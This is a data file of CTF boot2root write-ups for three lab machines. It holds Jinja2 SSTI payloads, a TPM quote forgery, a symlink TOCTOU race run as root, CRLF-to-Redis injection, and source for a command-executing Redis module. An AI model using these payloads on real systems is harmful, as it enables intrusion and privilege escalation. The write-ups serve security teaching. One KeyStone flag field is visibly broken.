import type { WriteUp } from "../types";

export const cryovaultWriteups: WriteUp[] = [
  {
    "id": "cryovault-b2b-echochamber",
    "title": "EchoChamber — User & Root",
    "category": "Boot2Root",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "**CTF:** ISFCR 2026  \n**Platform:** TryHackMe  \n**Category:** boot2boot / Web / Linux Privilege Boundary",
    "problemDescription": "The EchoChamber machine exposes an Anadyne Alert Review Console containing an authenticated Jinja2 SSTI vulnerability.\n\nInitial exploitation provides command execution as `analyst`. Further enumeration reveals a Unix socket belonging to Sentinel, which exposes a shell execution operation gated by a predictable time-based nonce.\n\nThe Sentinel process possesses `CAP_DAC_READ_SEARCH`, enabling it to read the protected user and root flags without executing as UID 0.",
    "tools": [],
    "analysis": "Nmap identified SSH on port 22 and HTTP on port 80.\n\nThe login page disclosed the development credentials `analyst:analyst`.\n\nAfter authentication, the alert preview endpoint accepted JSON with `title` and `body` fields. Submitting `{{7*7}}` returned `49`, confirming server-side template evaluation.\n\nThe following Jinja2 expression provided command execution:\n\n`{{ cycler.__init__.__globals__.os.popen('id').read() }}`\n\nThe response confirmed execution as `analyst` (UID 1001), a member of the `echo-log` group.",
    "solution": [
      {
        "title": "EchoChamber and the Warden",
        "content": "Enumeration identified three services: the EchoChamber classifier, the root-owned warden, and the Sentinel daemon.\n\nThe classifier analyzes command fingerprints, command sequences, timing variation, line lengths, and character statistics. Sessions scoring above `0.50` are classified as agents.\n\nThe warden uses these classifications to switch symlinks between real and decoy files. During exploitation, the system was in `human` mode, meaning the real Sentinel dispatch was active.\n\nNo classifier manipulation was needed."
      },
      {
        "title": "Sentinel IPC Exploitation",
        "content": "Sentinel listens on `/run/sentinel/ctrl.sock`, a Unix socket with permission `0666`.\n\nIts real dispatch includes a `shell` operation that executes Base64-encoded commands through `/bin/sh -c`.\n\nThe operation requires a nonce calculated from the current Unix minute and a constant salt published in Sentinel's source code.\n\nThe nonce is derived from SHA-256 and truncated to 16 hexadecimal characters. Because the algorithm and salt are public, it can be computed by an unprivileged caller.\n\nThrough the original SSTI, we executed a Python client that connected to Sentinel's Unix socket, submitted the calculated nonce, and requested both flag files."
      },
      {
        "title": "Linux Capabilities",
        "content": "The command executed under the `sentinel` account (UID 1003), not root.\n\nHowever, the Sentinel service runs with ambient `CAP_DAC_READ_SEARCH`, which bypasses ordinary file read and directory traversal permission checks. This allowed the command to read both `/home/sentinel/user.txt` and `/root/root.txt`.\n\nTherefore, obtaining the root flag did not require a traditional root shell or SUID exploitation."
      },
      {
        "title": "Result",
        "content": "The Sentinel service returned `ok: true`, exit code `0`, and the contents of both protected files.\n\n**User Flag**\n\n`isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}`\n\n**Root Flag**\n\n`isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}`"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-b2b-keystone",
    "title": "KeyStone — User & Root",
    "category": "Boot2Root",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "> **CTF:** ISFCR 2026 · **Platform:** TryHackMe · **Machine:** KEYSTONE  \n> **Category:** Web / TPM Attestation / Cryptography / Linux Privilege Escalation / TOCTOU  \n> **Target during the solve:** `10.49.151.41` (dynamic lab IP)  \n> **Status:** Solved — both flags recovered from the live machine.",
    "problemDescription": "> **CTF:** ISFCR 2026 · **Platform:** TryHackMe · **Machine:** KEYSTONE  \n> **Category:** Web / TPM Attestation / Cryptography / Linux Privilege Escalation / TOCTOU  \n> **Target during the solve:** `10.49.151.41` (dynamic lab IP)  \n> **Status:** Solved — both flags recovered from the live machine.\n\n| Flag | Value |\n| --- | --- |\n| **User** | `isfcr{tr0st_but_v3rify_the_endors3ment}` |\n| **Root** | `isfcr{a_pcr_is_a_promise_not_proof}` |",
    "tools": [],
    "analysis": "The TryHackMe VPN route was active, and the target replied to ICMP. Initial and full-range TCP scans:\n\n```bash\nexport TARGET=10.49.151.41\n\nsudo nmap -Pn -n -sS -sV -sC --top-ports 1000 \\\n  -oN nmap-initial.txt \"$TARGET\"\n\nsudo nmap -Pn -n -sS -p- --min-rate 1000 --max-retries 2 \\\n  -oN nmap-full.txt \"$TARGET\"\n```\n\nRelevant results:\n\n```text\n22/tcp open  ssh   OpenSSH 9.2p1 Debian 2+deb12u10\n80/tcp open  http  nginx 1.22.1\n             http-title: Keystone — Attestation Portal\n```\n\nThe full scan also listed UDP-adjacent service name `llmnr` on **filtered TCP/5355**, not an exploitable open port. The attack used HTTP and, later, SSH only.\n\nThe homepage pointed to:\n\n- `/review?doc=welcome`\n- `/review?doc=changelog`\n- `/review?doc=operators`\n- `/review?doc=deprecation`\n\nIt also disclosed that the internal vault runs at `127.0.0.1:9000` and documents the protocol in `/etc/keystone/README.md`.\n\nThe review documents explained the workflow:\n\n```text\nPOST /attest  -> session, nonce, expected PCRs\nPOST /verify  -> verify quote; issue token\nGET /secret  -> release sealed payload to a valid token\n```\n\nThe `changelog` contained two unusually specific findings:\n\n```text\n2026-09-21  Audit: AK provenance was NOT linked to EK. Opened VAULT-114.\n2026-10-02  Portal operators requested doc-template interpolation;\n            added Jinja2 render on /review.\n2026-10-05  TODO: finish credential-activation plumbing ...\n            client-supplied AK as trusted after signature verification only.\n```\n\nThose disclosures precisely identify both entry point and attestation flaw.\n\nThe intended policy is to execute only binaries whose SHA-256 digest is approved. The helper checks one pathname, then performs a **second open** before execution. A user who controls a symlink at that pathname can swap its target in the small interval between the hash check and the executable's second open.\n\n```text\n                  Privileged helper                 Attacker\n                  -----------------                 --------\n                  open(link -> safe)\n                  SHA256(safe) = allowlisted\n                  close(safe)\n                                                       inotify: IN_CLOSE_NOWRITE\n                                                       atomic replace(link -> evil-root)\n                  reopen(link -> evil-root)\n                  fexecve(evil-root) as root\n```\n\nA hash check and subsequent execution of a *different file* do not establish execution integrity. This is a **time-of-check to time-of-use (TOCTOU)** race condition.",
    "solution": [
      {
        "title": "TL;DR",
        "content": "KeyStone exposes a document review portal that evaluates the user-supplied `doc` query parameter as a **Jinja2 template**. Unauthenticated server-side template injection (SSTI) grants code execution as `webapp`. From there we accessed a locally bound Go-based attestation vault. The vault verifies a TPM-like quote against a **client-supplied Attestation Key (AK)** but fails to prove that the AK belongs to a genuine, trusted TPM via the Endorsement Key (EK). We generated our own RSA key and signed a hand-crafted `TPMS_ATTEST` structure. The vault accepted it and released an SSH private key for `tpm-admin`.\n\nAfter SSH login, `tpm-admin` could invoke `/usr/sbin/measure-and-run *` through passwordless `sudo`. The helper hashes an allowed binary before reopening the same pathname for execution. By watching for the hash-read close event using `inotify` and atomically swapping a symlink, we caused the privileged helper to verify `/bin/true` yet execute our shell script as root. The script copied `/root/root.txt` to a readable location.",
        "code": "Attacker (VPN)\n  |\n  | GET /review?doc={{ ... }}\n  v\nJinja2 SSTI on :80  -- RCE --> webapp (UID 1001)\n  |\n  | HTTP requests from the target to 127.0.0.1:9000\n  v\nGo attestation vault\n  |   /attest: accepts attacker-created RSA AK public key\n  |   /verify: accepts forged TPMS_ATTEST + valid RSA signature\n  |   /secret: releases sealed tpm-admin SSH private key\n  v\nSSH as tpm-admin (UID 1003)\n  |   /home/tpm-admin/user.txt          [USER]\n  |\n  | sudo -n /usr/sbin/measure-and-run ~/race/link\n  |        hash: link -> safe (/bin/true; approved hash)\n  |      inotify -> atomic swap: link -> evil-root\n  |        execute: link -> evil-root (as root)\n  v\n/root/root.txt copied to ~/race/root_result.txt [ROOT]"
      },
      {
        "title": "Unauthenticated Jinja2 SSTI",
        "content": "The parameter `doc` looked like a document selector; path traversal probes produced `no such document`. However, a template arithmetic probe was evaluated:\n\n\n\nResponse excerpt:\n\n\n\nBecause the application rendered the submitted selector as a template, a standard Jinja2 object traversal enabled shell commands:\n\n\n\n\n\nThe Python client used by our subsequent solver extracted the text between `Requested:` and `</p>` and HTML-decoded it. The actual identity returned:\n\n\n\nThe command `cat /opt/vault/main.go` through the same SSTI returned the complete Go source, revealing the vault's exact signature checks and quote parser. This was **unauthenticated RCE**: the review route needed no login.",
        "code": "export URL='http://10.49.151.41'\n\ncurl -sS -G \"$URL/review\" \\\n  --data-urlencode 'doc={{7*7}}' \\\n  | grep 'Requested:'"
      },
      {
        "title": "SSTI execution primitive",
        "content": "",
        "code": "import html, re, urllib.parse, urllib.request\n\nPORTAL = 'http://10.49.151.41'\n\ndef ssti(command: str) -> str:\n    expr = \"{{ cycler.__init__.__globals__.os.popen(\" + repr(command) + \").read() }}\"\n    url = PORTAL + '/review?' + urllib.parse.urlencode({'doc': expr})\n    with urllib.request.urlopen(url, timeout=20) as response:\n        page = response.read().decode('utf-8', 'replace')\n    match = re.search(r'Requested:\\s*(.*?)</p>', page, re.S)\n    if not match:\n        raise RuntimeError('Unexpected review response')\n    return html.unescape(match.group(1)).strip()\n\nprint(ssti('id'))"
      },
      {
        "title": "Reading the attestation implementation",
        "content": "The locally bound service was written in Go (`/opt/vault/main.go`). Its public-facing HTTP methods were unavailable directly over the VPN, but the SSTI allowed an HTTP client running **on the target** to talk to `127.0.0.1:9000`.\n\nThe source described the handshake:\n\n\n\n\n\n\n\nSuccessful verification issues a token; `GET /secret?token=...` returns a `payload`. Tokens are **single-use** and expire after five minutes.",
        "code": "POST /attest\n{\"ak_pub_pem\":\"-----BEGIN PUBLIC KEY-----...\"}"
      },
      {
        "title": "1 What the server verifies",
        "content": "`/verify` performs these checks:\n\n1. Verify `quote_sig` as **RSA PKCS#1 v1.5 / SHA-256** over `quote_msg`, using the public key supplied to `/attest`.\n2. Parse `quote_msg` as a `TPMS_ATTEST` structure and check `magic == 0xFF544347`.\n3. Check attestation type `0x8018` (`TPM_ST_ATTEST_QUOTE`).\n4. Compare `extraData` against the server-issued nonce.\n5. Compare `pcrDigest` against the server-computed expected PCR digest.\n\nThe critical missing check, explicitly marked `VAULT-114` in the source, is **AK-to-EK credential activation**. Nothing proves that this AK was generated or protected by the intended TPM. A mathematically valid signature under a freely selected public key is not a proof of TPM provenance.\n\nThe configured golden SHA-256 PCR values for PCRs `0`, `1`, and `7` were each 32 zero bytes. Hence:\n\n\\[\nD = \\operatorname{SHA256}(PCR_0 \\parallel PCR_1 \\parallel PCR_7)\n  = \\operatorname{SHA256}(\\texttt{00}^{96})\n\\]\n\n\n\nThe Go quote parser also did not authenticate the quote's PCR-selection provenance or whether the marshalled bytes came from a TPM; it parsed the supplied buffer and compared the two extracted fields against its expectations.",
        "code": "2ea9ab9198d1638007400cd2c3bef1cc745b864b76011a0e1bc52180ac6452d4"
      },
      {
        "title": "Forging a TPM 2.0 quote (User-stage exploit)",
        "content": "We generated a new 2048-bit RSA private key **locally** and submitted its public component as an AK. After obtaining the nonce and expected PCR digest, we built the binary attestation buffer in network byte order (`big endian`) exactly as expected by `/opt/vault/main.go`.\n\n\n\nThe PCR bitmap `0x83` sets bits `0`, `1`, and `7` in the first selection byte.\n\nThe forge-and-sign logic:\n\n\n\n**Important:** The code above is a targeted excerpt of the crypto logic. The complete executable solver handles the SSRF-like internal HTTP access through SSTI and request staging; it is provided separately as `keystone_user_solve_v3.py`.",
        "code": "import struct\n\ndef forge_quote(nonce: bytes, digest: bytes) -> bytes:\n    return (\n        struct.pack('>IH', 0xFF544347, 0x8018)       # magic + quote type\n        + struct.pack('>H', 0)                        # TPM2B_NAME: empty qualifiedSigner\n        + struct.pack('>H', len(nonce)) + nonce       # TPM2B_DATA: nonce as extraData\n        + bytes(17)                                  # TPMS_CLOCK_INFO\n        + bytes(8)                                   # firmwareVersion\n        + struct.pack('>IHB', 1, 0x000B, 3)           # 1 PCR bank, SHA256, selection size 3\n        + bytes((0x83, 0, 0))                         # selection bitmap: PCR 0,1,7\n        + struct.pack('>H', len(digest)) + digest      # TPM2B_DIGEST\n    )"
      },
      {
        "title": "1 Solving the transport problem",
        "content": "The initial approach nested a long, Base64-encoded Python HTTP client inside the `doc` parameter. It failed with `500 Internal Server Error`. A shorter, single-shot `curl` POST still failed at a URL length of about **941 characters**. The site stayed online, and short SSTI commands continued working. This implicated the payload/templating path, though the server error trace was not available to determine the precise limit.\n\nThe working solver used **chunked request staging**:\n\n1. Serialize the request body as compact JSON and Base64-encode it.\n2. Write Base64 fragments of **96 characters** each into a randomly named file under `/tmp` using short SSTI commands.\n3. Run a short command on the target that decodes the staged body and pipes it to `curl` against `127.0.0.1:9000`.\n4. Parse the HTTP status and JSON result, then delete the staging file.\n\nRepresentative shell operation executed through SSTI:\n\n\n\nThis preserved the exact bytes of the JSON body while keeping each `/review?doc=` URL short.",
        "code": "base64 -d /tmp/ks_ctf_<random>.b64 | \\\n  curl -sS -m 12 -X POST \\\n  -H 'Content-Type: application/json' \\\n  --data-binary @- http://127.0.0.1:9000/attest \\\n  -w '\\nKS_HTTP:%{http_code}'"
      },
      {
        "title": "2 Observed success",
        "content": "Running the working version:\n\n\n\nKey solver output:\n\n\n\nThe vault released **SSH credentials**, not the flag itself. The private key is deliberately omitted from this public writeup.",
        "code": "source /home/nata/ctf_env/bin/activate\npip install cryptography    # only if unavailable\n\npython3 keystone_user_solve_v3.py | tee keystone_flag.txt"
      },
      {
        "title": "SSH access and User flag",
        "content": "Extract the OpenSSH private key from the sealed payload stored in the terminal log:\n\n\n\nThe SSH session established:\n\n\n\n\n\n\n**User flag:**",
        "code": "awk '\n/^-----BEGIN OPENSSH PRIVATE KEY-----$/ {printing=1}\nprinting {print}\n/^-----END OPENSSH PRIVATE KEY-----$/ {printing=0}\n' keystone_flag.txt > keystone_tpm_admin\n\nchmod 600 keystone_tpm_admin\nssh-keygen -y -f keystone_tpm_admin >/dev/null && echo '[+] SSH private key valid'\n\nssh -i keystone_tpm_admin -o IdentitiesOnly=yes tpm-admin@10.49.151.41"
      },
      {
        "title": "Privilege escalation: `measure-and-run` (Root)",
        "content": "The `tpm-admin` account had a narrowly scoped-looking but dangerous sudo rule:\n\n\n\n\n\nThe helper was a **root-owned ELF binary** (`/usr/sbin/measure-and-run`). `strings` revealed the workflow and important functions:\n\n\n\nThe allowlist contained known SHA-256 digests for `/bin/true`, `/bin/false`, `/usr/bin/id`, `/usr/bin/uname`, and `/usr/bin/whoami`. Crucially, the user-controlled `~/race/safe` was an **exact copy of `/bin/true`**:\n\n\n\nThe challenge provided a symlink and an example malicious script:",
        "code": "sudo -l"
      },
      {
        "title": "2 Create a minimal payload",
        "content": "The objective was to read the protected root flag, not to maintain root access. On the SSH shell as `tpm-admin`:",
        "code": "cat > ~/race/evil-root <<'EOF'\n#!/bin/sh\n/bin/cat /root/root.txt > /home/tpm-admin/race/root_result.txt\n/bin/chmod 644 /home/tpm-admin/race/root_result.txt\nEOF\n\nchmod +x ~/race/evil-root"
      },
      {
        "title": "3 Race using inotify and atomic symlink replacement",
        "content": "Rather than randomly toggling the symlink thousands of times, we monitored the file-close event on the safe binary. `IN_CLOSE_NOWRITE` is emitted when a read-only descriptor is closed; this provides a timing signal just after hashing completes. We used `os.replace` to switch the symlink atomically.\n\nCore of the Python race:\n\n\n\nA complete standalone version is provided as `keystone_root_race.py`. Transfer it from the attacker host (using the extracted SSH key), then run it **on the KeyStone SSH machine** after creating `evil-root`:",
        "code": "IN_CLOSE_NOWRITE = 0x10\n\n# fd: an inotify instance, watch registered on ~/race/safe\n# proc: sudo /usr/sbin/measure-and-run ~/race/link\nready, _, _ = select.select([fd], [], [], 10)\nif ready:\n    os.read(fd, 4096)\n    swap('evil-root')  # os.symlink() + os.replace()"
      },
      {
        "title": "4 Actual exploit output",
        "content": "The user-supplied run succeeded **on attempt 1**:\n\n\n\nThis proves the verified hash matched the approved `/bin/true` digest, **but the privileged execution path ran the new script**. Success does not imply we obtained an interactive root shell; it confirms root-context command execution sufficient to read `/root/root.txt`.\n\n**Root flag:**",
        "code": "[*] Safe SHA256: c79bf44242829108e323378531f4ac839513ca1fba45efd6583643526e1e9fd2\n[+] Safe binary is allowlisted\n\n[*] Attempt 1\n[+] Safe file closed after read\n[+] Switching link -> evil-root\nmeasure-run: sha256(/home/tpm-admin/race/link) = c79bf44242829108e323378531f4ac839513ca1fba45efd6583643526e1e9fd2\nmeasure-run: policy ok, launching...\n\n========== ROOT FLAG ==========\nisfcr{a_pcr_is_a_promise_not_proof}"
      },
      {
        "title": "Why the two vulnerabilities work",
        "content": "| Stage | Broken assumption | Result |\n| --- | --- | --- |\n| Web application | Template input was assumed to be safe trusted content | Unauthenticated SSTI, command execution as `webapp` |\n| TPM vault | A valid signature by *a supplied AK* proves the quote originated from the expected TPM | Forged quote passes; attested secret released |\n| Credential handling | Token-gated release implies a trustworthy claimant | SSH private key disclosed to unauthenticated attacker |\n| Privileged helper | Hashing a mutable pathname authenticates the file later executed via that pathname | Approved file checked, attacker script launched as root |"
      },
      {
        "title": "Reproduction files",
        "content": "| File | Purpose | Where to run |\n| --- | --- | --- |\n| `keystone_user_solve_v3.py` | SSTI tunnel, attacker-controlled RSA AK, forged quote, `/verify`, `/secret` | Attacker WSL/Linux host |\n| `keystone_root_race.py` | `inotify` + atomic symlink swap against `measure-and-run` | SSH session as `tpm-admin` |\n\n**Requirements:** Python 3 and `cryptography` on the attacker side; `curl`, `base64`, and local network access to the vault from the SSTI process; Python 3 and `sudo` on KeyStone for the root stage. The old direct one-shot SSTI transport produced HTTP 500; use the chunked v3 transport.\n\n**Operational caution:** This walkthrough applies to the explicitly authorized TryHackMe lab. The target IP and key are challenge-instance artifacts. Never upload the extracted OpenSSH private key or access token to a public writeup/repository.\n\n---"
      },
      {
        "title": "Final flags",
        "content": "**Conclusion:** KeyStone failed twice at the same conceptual boundary: it verified a *representation* of trusted state without binding that representation to the genuine actor or file it was supposed to represent. In the user stage, a valid signature over a fabricated quote was mistaken for genuine TPM attestation; in the root stage, a valid hash over an approved file was mistaken for integrity of the file ultimately executed.",
        "code": "User: isfcr{tr0st_but_v3rify_the_endors3ment}\nRoot: isfcr{a_pcr_is_a_promise_not_proof}"
      }
    ],
    "terminalOutputs": [],
    "flag": "operatorname{SHA256}",
    "lessonsLearned": "1. **Web:** Never compile user input as a Jinja2 template. Use trusted templates with escaped untrusted values; sandboxing alone should not be the primary isolation boundary.\n2. **Attestation:** Complete AK-to-EK credential activation and verify the chain to a trusted TPM and appropriate platform policy. Validate quote structure, PCR selection and hash algorithms, and expected nonce/digest. A nonce proves freshness only, not key provenance.\n3. **Secrets:** Minimize exposure of long-lived SSH private keys even to apparently attested clients; use scoped short-lived credentials where possible.\n4. **Privileged execution:** Verify and execute the **same opened file descriptor** (or otherwise bind the approved content to what is executed); eliminate second pathname lookups and symlink races. Restrict root-executable helpers and dangerous sudo command arguments."
  },
  {
    "id": "cryovault-b2b-quiet",
    "title": "QUIET — User & Root",
    "category": "Boot2Root",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "> **CTF:** ISFCR CryoVault 2026 · **Platform:** TryHackMe · **Machine:** QUIET  \n> **Categories:** Web / SSRF / CRLF Injection / Redis / Native Code / Unix Sockets / Linux Capabilities  \n> **Target during the solve:** `10.49.157.44` (ephemeral lab address)  \n> **Status:** **Solved — both challenge flags verified against the lab output**",
    "problemDescription": "> **CTF:** ISFCR CryoVault 2026 · **Platform:** TryHackMe · **Machine:** QUIET  \n> **Categories:** Web / SSRF / CRLF Injection / Redis / Native Code / Unix Sockets / Linux Capabilities  \n> **Target during the solve:** `10.49.157.44` (ephemeral lab address)  \n> **Status:** **Solved — both challenge flags verified against the lab output**\n\n| Objective | Verified flag |\n|---|---|\n| **User** | `isfcr{th3_k3rn3l_l13d_but_dd_t3lls_th3_truth}` |\n| **Root** | `isfcr{r00ted_by_r3n4m1ng_0bjdump}` |\n\n> [!IMPORTANT]\n> A hardcoded maintenance key also allowed SSH login as `root`, but `cat /root/root.txt` in that SSH session returned **`isfcr{n0t_th15_0ne_k33p_l00k1ng}` — a decoy**. The actual Root challenge flag was obtained from the `quiet-relay` execution path. We did **not** need to gain UID 0 via the relay to read it.\n\n---",
    "tools": [],
    "analysis": "The target was reachable via the TryHackMe VPN. Initial Nmap service discovery:\n\n```bash\nexport TARGET=10.49.157.44\nexport URL=\"http://$TARGET\"\n\nsudo nmap -Pn -n -sS -sV -sC --top-ports 1000 \\\n  -oN nmap-quiet-initial.txt \"$TARGET\"\n\nsudo nmap -Pn -n -sS -p- --min-rate 1000 --max-retries 2 \\\n  -oN nmap-quiet-full.txt \"$TARGET\"\n```\n\nRelevant output:\n\n```text\n22/tcp open ssh  OpenSSH 9.2p1 Debian 2+deb12u10\n80/tcp open http nginx 1.22.1\n             http-title: SMART Disk Health Monitor\n```\n\nThe full scan also listed various **filtered** TCP ports. We did not treat them as exposed services.\n\nThe landing page was unusually direct:\n\n```html\n<title>SMART Disk Health Monitor</title>\n<h1>SMART Disk Health Monitor</h1>\n<p>Internal report console. See <code>/api/report/preview</code>\n   and <code>/api/attachment/upload</code>.</p>\n<pre>\nPOST /api/report/preview  {\"url\": \"http://collector.internal/report.csv\"}\nPOST /api/attachment/upload  multipart/form-data with field \"file\"\n</pre>\n```\n\nA health check disclosed the spool location:\n\n```http\nGET /health HTTP/1.1\n```\n\n```json\n{\"spool\":\"/var/spool/quiet-app\",\"status\":\"ok\"}\n```\n\nThere was no login page and no authentication gate on either advertised API.",
    "solution": [
      {
        "title": "TL;DR",
        "content": "The SMART Disk Health Monitor exposes `/api/report/preview`, a URL-preview endpoint that opens an outbound socket and assembles an HTTP request using attacker-controlled URL content. Inserting **literal CRLF characters** into the URL turns the apparent SSRF into **arbitrary Redis protocol commands** against a local Redis 7.0.15 instance.\n\nA separate, unauthenticated attachment API writes arbitrary binary content to `/var/spool/quiet-app`. Since Redis accepts `MODULE LOAD` from its local connection, we upload a Redis module, load it from the spool, and register `QUIET.EXEC` to execute operating-system commands as `app` (UID 1001).\n\nWe then find `/run/quiet-relay/ctrl.sock`, a world-accessible Unix socket operated by a different account, `relay`. Its `exec_hook` handler uses `SO_PEERCRED` **unless** the caller supplies the JSON value `\"cap_verify\":true`. The code does **not** validate the caller's claimed `CAP_SYS_ADMIN` capability. Supplying this flag bypasses the UID check and causes the relay to execute our Base64-encoded shell script.\n\nFinally, the relay runs with ambient **`CAP_DAC_READ_SEARCH`**, **`CAP_SYS_ADMIN`**, and **`CAP_BPF`**. The first capability is enough for the relay's shell command to read a root-protected file even though the process is not UID 0. That yields both the User and Root flags.",
        "code": "flowchart TD\n    A[\"Attacker over THM VPN\"] -->|\"POST /api/report/preview\"| B[\"SSRF primitive on HTTP :80\"]\n    B -->|\"Literal CRLF in URL\"| C[\"Redis protocol injection :6379\"]\n    A -->|\"POST /api/attachment/upload\"| D[\"Uploaded Redis module .so in spool\"]\n    D -->|\"MODULE LOAD\"| C\n    C -->|\"QUIET.EXEC\"| E[\"OS execution as app UID 1001\"]\n    E -->|\"Unix socket request\"| F[\"quiet-relay service\"]\n    F -->|\"cap_verify:true bypass\"| G[\"exec_hook as relay\"]\n    G --> H[\"User: /home/relay/user.txt\"]\n    G -->|\"CAP_DAC_READ_SEARCH\"| I[\"Real root flag\"]\n    J[\"Hardcoded maintenance SSH key\"] -.-> K[\"SSH as root: decoy flag\"]"
      },
      {
        "title": "Establishing SSRF",
        "content": "The preview endpoint makes network requests from the target machine:\n\n\n\nThe JSON response contained a **raw HTTP response**, including headers, along with a byte count:\n\n\n\nThe URL `file:///etc/passwd` returned `400 bad url`; `127.0.0.1:9000` was not listening. The fictitious `collector.internal` hostname did not resolve. Those probes did **not** provide file read or a useful internal collector.\n\nAdditional localhost checks exposed:\n\n\n\nThe preview only exposes the first **512 bytes** of a fetched response; this limitation later matters for shell output and source-code extraction.",
        "code": "jq -nc --arg url 'http://127.0.0.1:80/health' '{url:$url}' |\n  curl -sS -X POST \"$URL/api/report/preview\" \\\n    -H 'Content-Type: application/json' --data-binary @- | jq ."
      },
      {
        "title": "CRLF Injection: From HTTP URL to Redis Commands",
        "content": "The key differential was **percent-encoded CRLF vs. literal CRLF** in the URL:\n\n| Input | Observation |\n|---|---|\n| `http://127.0.0.1:8080/health` | Normal HTTP 200, headers + JSON |\n| `http://127.0.0.1:8080/health%0d%0aX-Test:%20yes` | HTTP 404 |\n| `http://127.0.0.1:8080/health\\r\\nX-Test: yes` | Bare JSON body, **without the HTTP header** |\n| `gopher://127.0.0.1:6379/_PING%0d%0a` | No usable Redis reply |\n\n**The working character sequence is actual `\\r\\n` bytes inside the submitted JSON string**, *not* the percent-encoded spelling `%0d%0a`.\n\nThe backend evidently sends a request to the chosen host/port based on raw URL material. The literal newline introduces additional protocol lines. Redis then interprets the injected lines as Redis commands."
      },
      {
        "title": "Minimal proof",
        "content": "**Observed:**\n\n\n\nThe leading `$-1` reflects the initial HTTP-like line being processed as a Redis request for a nonexistent key; `+PONG` and `+OK` confirm the injected `PING` and `QUIT` were accepted. This was the first point at which we had **Redis command execution**, not merely SSRF.\n\nWe also executed `INFO server` and obtained:",
        "code": "import json\nimport urllib.request\n\napi = \"http://10.49.157.44/api/report/preview\"\nurl = \"http://127.0.0.1:6379/\\r\\nPING\\r\\nQUIT\\r\\n\"\nrequest = urllib.request.Request(\n    api,\n    data=json.dumps({\"url\": url}).encode(),\n    headers={\"Content-Type\": \"application/json\"},\n    method=\"POST\",\n)\nprint(json.load(urllib.request.urlopen(request))[\"preview\"])"
      },
      {
        "title": "Useful Redis wrapper",
        "content": "The following wrapper encodes commands as RESP arrays. The primitive is still the literal CRLF inside the `url` JSON value:\n\n\n\nThe active Redis ACL user was `default`. Other enumeration revealed a nearly empty keyspace (`x = hello`) and:\n\n\n\n`enable-module-command = local` matters: **the SSRF originates from `127.0.0.1` on the target**, satisfying the localhost-only command restriction. The missing-file test showed the module loader was reachable, but not yet that our module would load.",
        "code": "import json\nimport urllib.request\n\nAPI = \"http://10.49.157.44/api/report/preview\"\n\ndef resp(*args):\n    body = f\"*{len(args)}\\r\\n\"\n    for arg in args:\n        arg = str(arg)\n        body += f\"${len(arg.encode())}\\r\\n{arg}\\r\\n\"\n    return body\n\ndef redis(*args):\n    target = (\n        \"http://127.0.0.1:6379/\\r\\n\"\n        + resp(*args)\n        + resp(\"QUIT\")\n    )\n    req = urllib.request.Request(\n        API,\n        data=json.dumps({\"url\": target}).encode(),\n        headers={\"Content-Type\": \"application/json\"},\n        method=\"POST\",\n    )\n    with urllib.request.urlopen(req, timeout=15) as response:\n        return json.load(response)[\"preview\"]\n\nprint(redis(\"ACL\", \"WHOAMI\"))"
      },
      {
        "title": "Weaponizing the Attachment Upload",
        "content": "An unauthenticated upload with the multipart field `file` returned a real filesystem pathname:\n\n\n\nExample response:\n\n\n\nThe upload endpoint generates a random basename but **preserves a safe extension**, including `.so`. Simple `../traversal.txt` filename attempts were normalized; we did **not** obtain upload path traversal. The useful behavior was that **the server itself gave us an absolute path to attacker-supplied bytes**.",
        "code": "printf 'QUIET_TEST_MARKER_2026\\n' > marker.txt\ncurl -sS -X POST \"$URL/api/attachment/upload\" \\\n  -F 'file=@marker.txt;filename=probe.csv'"
      },
      {
        "title": "Minimal Redis module",
        "content": "We compiled a Redis 7 module exposing `QUIET.EXEC`. The full companion source is `quiet_module.c`. Core logic:\n\n\n\nThe 320-byte limit on command output is intentional because the SSRF response preview is capped at 512 bytes. This is not a generic-purpose shell: it is a deliberately small CTF command primitive.\n\nBuild in the attacker's WSL environment:\n\n\n\nThe observed compiled result was an ELF x86-64 shared object. The complete companion `quiet_module_runner.py` script uploaded it through `/api/attachment/upload` and sent `MODULE LOAD` via Redis RESP + SSRF.",
        "code": "static int QuietExec(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {\n    if (argc != 2) return RedisModule_WrongArity(ctx);\n\n    size_t len = 0;\n    const char *raw = RedisModule_StringPtrLen(argv[1], &len);\n    if (len == 0 || len > 2048 || memchr(raw, '\\0', len) != NULL)\n        return RedisModule_ReplyWithError(ctx, \"ERR invalid command length\");\n\n    char *cmd = malloc(len + 6);\n    memcpy(cmd, raw, len);\n    memcpy(cmd + len, \" 2>&1\", 6);\n    FILE *fp = popen(cmd, \"r\");\n    free(cmd);\n    if (!fp) return RedisModule_ReplyWithError(ctx, \"ERR popen failed\");\n\n    char output[321];\n    size_t count = fread(output, 1, 320, fp);\n    pclose(fp);\n    RedisModule_ReplyWithStringBuffer(ctx, output, count);\n    return REDISMODULE_OK;\n}\n\nint RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {\n    REDISMODULE_NOT_USED(argv);\n    REDISMODULE_NOT_USED(argc);\n    if (RedisModule_Init(ctx, \"quietprobe\", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)\n        return REDISMODULE_ERR;\n    return RedisModule_CreateCommand(ctx, \"quiet.exec\", QuietExec,\n                                     \"readonly\", 0, 0, 0);\n}"
      },
      {
        "title": "Observed execution",
        "content": "**Result:** Linux command execution was confirmed **as `app` (UID 1001)**, not as root.",
        "code": "[1] Uploading Redis module (78672 bytes)\n[+] Saved remotely at: /var/spool/quiet-app/e95a9d4d6245.so\n[2] Redis MODULE LOAD: /var/spool/quiet-app/e95a9d4d6245.so\n'$-1\\r\\n+OK\\r\\n+OK\\r\\n'\n\n[3] Redis MODULE LIST:\n... name = quietprobe ... path = /var/spool/quiet-app/e95a9d4d6245.so ...\n\n[QUIET.EXEC] id\nuid=1001(app) gid=1001(app) groups=1001(app)"
      },
